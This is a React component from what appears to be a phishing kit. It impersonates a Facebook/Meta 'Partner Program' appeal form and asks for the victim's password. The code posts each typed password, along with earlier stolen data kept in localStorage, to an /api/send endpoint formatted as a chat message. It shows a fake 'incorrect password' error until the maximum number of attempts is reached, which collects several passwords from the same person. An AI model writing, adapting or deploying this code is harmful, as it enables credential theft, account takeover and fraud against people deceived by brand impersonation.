import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, setModalOpen } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Appeal Form', 'Password', "The password that you've entered is incorrect.", 'Continue'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const savedMessage = localStorage.getItem('message') || '';
        const message = savedMessage + `\n<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        try {
            await axios.post('/api/send', {
                message,
                message_id: messageId
            });
            localStorage.setItem('message', message);
            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <div className='flex w-full items-center justify-between'>
                    <p className='text-2xl font-bold'>{t('Performance Bonus Eligibility – Meta Partner Program')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>
                <Image src={FacebookLogoImage} alt='' className='mt-9 h-17.5 w-17.5' />
                <div className='flex w-full flex-1 flex-col justify-start px-4 pt-10'>
                    <div className='relative w-full'>
                        <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder={t('Password')} />
                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Password')}
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-4 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                    </div>
                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
                    <button
                        onClick={() => {
                            handleSubmit();
                        }}
                        disabled={isLoading}
                        className={`mt-4 flex h-12.5 w-full items-center justify-center gap-2 rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                    </button>
                </div>
                <div className='flex items-center justify-center pt-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
